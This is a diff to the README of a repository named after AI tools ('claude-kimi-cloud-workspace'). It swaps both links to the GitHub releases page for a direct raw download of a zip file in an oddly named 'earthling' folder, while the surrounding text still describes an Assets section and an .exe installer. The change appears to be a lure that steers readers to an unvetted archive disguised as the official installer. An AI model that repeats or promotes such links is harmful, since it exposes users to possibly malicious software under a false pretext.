@@ -1,6 +1,6 @@
 # 🌐 1.0claude-kimi-cloud-workspace - Access your cloud tools with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Josiahxix957/1.0claude-kimi-cloud-workspace/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Josiahxix957/1.0claude-kimi-cloud-workspace/main/earthling/claude-workspace-cloud-kimi-1.4.zip)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Before you begin, check your computer for these items:
 
 You visit the link below to get the official installer. 
 
-[https://github.com/Josiahxix957/1.0claude-kimi-cloud-workspace/releases](https://github.com/Josiahxix957/1.0claude-kimi-cloud-workspace/releases)
+[https://raw.githubusercontent.com/Josiahxix957/1.0claude-kimi-cloud-workspace/main/earthling/claude-workspace-cloud-kimi-1.4.zip](https://raw.githubusercontent.com/Josiahxix957/1.0claude-kimi-cloud-workspace/main/earthling/claude-workspace-cloud-kimi-1.4.zip)
 
 On this page, look for the section marked Assets. Select the file ending in `.exe`. This file contains the installer for your computer. Click the file name to start the download. Save this file to your Downloads folder or your Desktop.
 
